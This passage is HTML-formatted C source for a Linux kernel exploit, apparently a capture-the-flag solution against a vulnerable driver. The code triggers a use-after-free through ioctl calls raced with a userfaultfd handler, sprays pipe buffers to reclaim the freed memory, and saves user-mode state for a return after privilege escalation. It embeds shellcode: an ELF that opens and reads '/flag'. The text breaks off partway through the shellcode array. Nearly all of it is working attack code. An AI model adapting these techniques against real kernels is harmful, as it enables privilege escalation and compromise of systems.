class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// musl-gcc exp.c --static -masm=intel -lpthread -idirafter /usr/include/ -idirafter /usr/include/x86_64-linux-gnu/ -o exp</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/shm.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/keyctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/user.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/utsname.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/resource.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;asm/ldt.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/if_packet.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span></span><br><span class="line">    <span class="type">char</span> *msg;</span><br><span class="line">    <span class="type">uint64_t</span> a;</span><br><span class="line">    <span class="type">uint64_t</span> b;</span><br><span class="line">    <span class="type">uint64_t</span> c;</span><br><span class="line">    <span class="type">uint64_t</span> d;</span><br><span class="line">    <span class="type">uint64_t</span> e;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span> <span class="title">vuln</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_PIPE_COUNT 0x20</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_SECONDARY_PIPE_COUNT 0x150</span></span><br><span class="line"><span class="type">int</span> pipe_fd[MAX_PIPE_COUNT][<span class="number">2</span>];</span><br><span class="line"><span class="type">int</span> already_read[MAX_PIPE_COUNT];</span><br><span class="line"><span class="type">int</span> snd_pipe_fd[MAX_SECONDARY_PIPE_COUNT][<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">spray_pipes</span><span class="params">(<span class="type">int</span> start, <span class="type">int</span> cnt)</span> &#123;</span><br><span class="line">    <span class="type">char</span> *buf[<span class="number">0x1000</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] enter %s start from index: %d\n&quot;</span>, __PRETTY_FUNCTION__, start);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = start; i &lt; cnt; ++i) &#123;</span><br><span class="line">        <span class="keyword">if</span> (pipe(pipe_fd[i]) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            perror(<span class="string">&quot;create pipe&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">spray_pipes2</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> *buf[<span class="number">0x1000</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] enter %s\n&quot;</span>, __PRETTY_FUNCTION__);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; MAX_SECONDARY_PIPE_COUNT; ++i) &#123;</span><br><span class="line">        <span class="keyword">if</span> (pipe(snd_pipe_fd[i]) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            perror(<span class="string">&quot;create pipe&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (fcntl(snd_pipe_fd[i][<span class="number">1</span>], F_SETPIPE_SZ, <span class="number">0x1000</span> * <span class="number">1</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            perror(<span class="string">&quot;resize pipe&quot;</span>);    </span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;   </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">err_exit</span><span class="params">(<span class="type">char</span> *msg)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Error at: \033[0m%s\n&quot;</span>, msg);</span><br><span class="line">    sleep(<span class="number">5</span>);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">info</span><span class="params">(<span class="type">char</span> *msg)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[+] %s\n\033[0m&quot;</span>, msg);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">hexx</span><span class="params">(<span class="type">char</span> *msg, <span class="type">size_t</span> value)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] %s: %#lx\n\033[0m&quot;</span>, msg, value);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">binary_dump</span><span class="params">(<span class="type">char</span> *desc, <span class="type">void</span> *addr, <span class="type">int</span> len)</span> &#123;</span><br><span class="line">    <span class="type">uint64_t</span> *buf64 = (<span class="type">uint64_t</span> *) addr;</span><br><span class="line">    <span class="type">uint8_t</span> *buf8 = (<span class="type">uint8_t</span> *) addr;</span><br><span class="line">    <span class="keyword">if</span> (desc != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[33m[*] %s:\n\033[0m&quot;</span>, desc);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len / <span class="number">8</span>; i += <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;  %04x&quot;</span>, i * <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++) &#123;</span><br><span class="line">            i + j &lt; len / <span class="number">8</span> ? <span class="built_in">printf</span>(<span class="string">&quot; 0x%016lx&quot;</span>, buf64[i + j]) : <span class="built_in">printf</span>(<span class="string">&quot;                   &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;   &quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">32</span> &amp;&amp; j + i * <span class="number">8</span> &lt; len; j++) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, <span class="built_in">isprint</span>(buf8[i * <span class="number">8</span> + j]) ? buf8[i * <span class="number">8</span> + j] : <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* bind the process to specific core */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">bind_core</span><span class="params">(<span class="type">int</span> core)</span>&#123;</span><br><span class="line">    <span class="type">cpu_set_t</span> cpu_set;</span><br><span class="line"></span><br><span class="line">    CPU_ZERO(&amp;cpu_set);</span><br><span class="line">    CPU_SET(core, &amp;cpu_set);</span><br><span class="line">    sched_setaffinity(getpid(), <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Process binded to core \033[0m%d\n&quot;</span>, core);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">asm</span> <span class="title function_">volatile</span> <span class="params">(</span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov user_cs, cs;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov user_ss, ss;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov user_sp, rsp;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;pushf;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;pop user_rflags;&quot;</span></span></span><br><span class="line"><span class="params">    )</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> fd;</span><br><span class="line"><span class="type">char</span> v14[<span class="number">0x100</span>];</span><br><span class="line"><span class="type">void</span> <span class="title function_">add</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Begin add.&quot;</span>);</span><br><span class="line">    vuln.e = (<span class="type">size_t</span>)v14;</span><br><span class="line">    <span class="keyword">for</span>(;;)&#123;</span><br><span class="line">        <span class="type">int</span> result = ioctl(fd, <span class="number">0xFFF0</span>, &amp;vuln);</span><br><span class="line">        <span class="keyword">if</span>(result != <span class="number">-1</span>)&#123;</span><br><span class="line">            info(<span class="string">&quot;Add success.&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">del</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Begin delete&quot;</span>);</span><br><span class="line">    vuln.e = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(;;)&#123;</span><br><span class="line">        <span class="type">int</span> result = ioctl(fd, <span class="number">0xFFF1</span>, &amp;vuln);</span><br><span class="line">        <span class="keyword">if</span>(result != <span class="number">-1</span>)&#123;</span><br><span class="line">            info(<span class="string">&quot;Delete success.&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> uffd_buf[<span class="number">0x200</span>];</span><br><span class="line"><span class="type">void</span> <span class="title function_">register_userfaultfd</span><span class="params">(<span class="type">void</span>* uffd_buf, <span class="type">pthread_t</span> pthread_moniter, <span class="type">void</span>* handler)</span>&#123;</span><br><span class="line">    <span class="type">int</span> uffd;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_api</span> <span class="title">uffdio_api</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_register</span> <span class="title">uffdio_register</span>;</span></span><br><span class="line"> </span><br><span class="line">    uffd = syscall(__NR_userfaultfd, O_NONBLOCK|O_CLOEXEC);</span><br><span class="line">    <span class="keyword">if</span> (uffd == <span class="number">-1</span>) err_exit(<span class="string">&quot;syscall for userfaultfd ERROR in register_userfaultfd func&quot;</span>);</span><br><span class="line"> </span><br><span class="line">    uffdio_api.api = UFFD_API;</span><br><span class="line">    uffdio_api.features = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_API, &amp;uffdio_api) == <span class="number">-1</span>) err_exit(<span class="string">&quot;ioctl for UFFDIO_API ERROR&quot;</span>);</span><br><span class="line"> </span><br><span class="line">    uffdio_register.range.start = (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)uffd_buf;</span><br><span class="line">    uffdio_register.range.len = <span class="number">0x1000</span>;</span><br><span class="line">    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_REGISTER, &amp;uffdio_register) == <span class="number">-1</span>) err_exit(<span class="string">&quot;ioctl for UFFDIO_REGISTER ERROR&quot;</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="type">int</span> res = pthread_create(&amp;pthread_moniter, <span class="literal">NULL</span>, handler, uffd);</span><br><span class="line">    <span class="keyword">if</span> (res == <span class="number">-1</span>) err_exit(<span class="string">&quot;pthread_create ERROR in register_userfaultfd func&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">hijack_handler</span><span class="params">(<span class="type">void</span> *args)</span>&#123;</span><br><span class="line">    <span class="type">int</span> uffd = (<span class="type">int</span>)args;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uffdio_copy</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (;;)&#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">        pollfd.fd = uffd;</span><br><span class="line">        pollfd.events = POLLIN;</span><br><span class="line">        <span class="keyword">if</span> (poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>) == <span class="number">-1</span>)</span><br><span class="line">            err_exit(<span class="string">&quot;Failed to exec poll for leak_handler&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> res = read(uffd, &amp;msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line">        <span class="keyword">if</span> (res == <span class="number">0</span>)</span><br><span class="line">            err_exit(<span class="string">&quot;EOF on userfaultfd for leak_handler&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (res == <span class="number">-1</span>)</span><br><span class="line">            err_exit(<span class="string">&quot;ERROR on userfaultfd for leak_handler&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (msg.event != UFFD_EVENT_PAGEFAULT)</span><br><span class="line">            err_exit(<span class="string">&quot;INCORRET EVENT in leak_handler&quot;</span>);</span><br><span class="line">        <span class="comment">// operation</span></span><br><span class="line">        info(<span class="string">&quot;hijack the kernel in userfaultfd -- hijack_handler&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*] trigger uaf\n&quot;</span>);</span><br><span class="line">        del();</span><br><span class="line">        </span><br><span class="line">        sleep(<span class="number">3</span>);</span><br><span class="line">        spray_pipes(<span class="number">0</span>, MAX_PIPE_COUNT);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; MAX_PIPE_COUNT; ++i) &#123;</span><br><span class="line">            <span class="type">uint32_t</span> k = i;</span><br><span class="line">            write(pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;writesth&quot;</span>, <span class="number">8</span>);</span><br><span class="line">            write(pipe_fd[i][<span class="number">1</span>], &amp;k, <span class="keyword">sizeof</span>(<span class="type">uint32_t</span>));</span><br><span class="line">            write(pipe_fd[i][<span class="number">1</span>], &amp;k, <span class="keyword">sizeof</span>(<span class="type">uint32_t</span>));</span><br><span class="line">            write(pipe_fd[i][<span class="number">1</span>], &amp;k, <span class="keyword">sizeof</span>(<span class="type">uint32_t</span>));</span><br><span class="line">            write(pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;Qanux&quot;</span>, <span class="number">8</span>);</span><br><span class="line">            write(pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;Qanux&quot;</span>, <span class="number">8</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">char</span> tmp[<span class="number">0x10</span>];</span><br><span class="line"></span><br><span class="line">        uffd_buf[<span class="number">0</span>] = <span class="number">0xe180</span>;</span><br><span class="line"></span><br><span class="line">        uffdio_copy.src = uffd_buf;</span><br><span class="line">        uffdio_copy.dst = (<span class="type">unsigned</span> <span class="type">long</span>)msg.arg.pagefault.address &amp; ~(<span class="number">0x1000</span> - <span class="number">1</span>);</span><br><span class="line">        uffdio_copy.len = <span class="number">0x1000</span>;</span><br><span class="line">        uffdio_copy.mode = <span class="number">0</span>;</span><br><span class="line">        uffdio_copy.copy = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (ioctl(uffd, UFFDIO_COPY, &amp;uffdio_copy) == <span class="number">-1</span>)</span><br><span class="line">            err_exit(<span class="string">&quot;Failed to exec ioctl for UFFDIO_COPY in leak_handler&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> shellcode[] = &#123;</span><br><span class="line">    <span class="number">0x7f</span>, <span class="number">0x45</span>, <span class="number">0x4c</span>, <span class="number">0x46</span>, <span class="number">0x02</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x3e</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x78</span>, <span class="number">0x00</span>, <span class="number">0x40</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x40</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x40</span>, <span class="number">0x00</span>, <span class="number">0x38</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x05</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x40</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x40</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x97</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x97</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x10</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x48</span>, <span class="number">0xbf</span>, <span class="number">0x2f</span>, <span class="number">0x66</span>, <span class="number">0x6c</span>, <span class="number">0x61</span>, <span class="number">0x67</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x57</span>, <span class="number">0x48</span>,</span><br><span class="line">    <span class="number">0x89</span>, <span class="number">0xe7</span>, <span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xf6</span>, <span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xd2</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xc0</span>, <span class="number">0x02</span>,</span><br><span class="line">    <span class="number">0x0f</span>, <span class="number">0x05</span>, <span class="number">0x89</span>, <span class="number">0xc7</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xe6</span>, <span class="number">0x48</span>, <span class="number">0xc7</span>, <span class="number">0xc2</span>, <span class="number">0x00</span>, <span class="number">0x01</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xc0</span>, <span class="number">0x0f</span>, <span class="number">0x05</span>, <span class="number">0xb8</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0xbf</span>, <span class="number">0x01</span>, <span 